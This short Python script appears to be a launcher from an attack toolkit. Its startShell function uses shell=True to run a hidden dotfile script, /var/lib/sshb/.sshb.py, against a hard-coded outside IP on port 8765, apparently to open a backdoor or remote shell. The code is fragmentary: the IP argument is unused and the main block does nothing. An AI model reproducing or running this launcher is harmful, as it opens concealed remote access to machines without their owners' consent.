import subprocess
import threading

IPs = ["129.21.49.57"]


def startShell(IP):
    subprocess.run("python3.1 /var/lib/sshb/.sshb.py 129.21.49.57 8765",shell=True)


if __name__ == "__main__":
    pass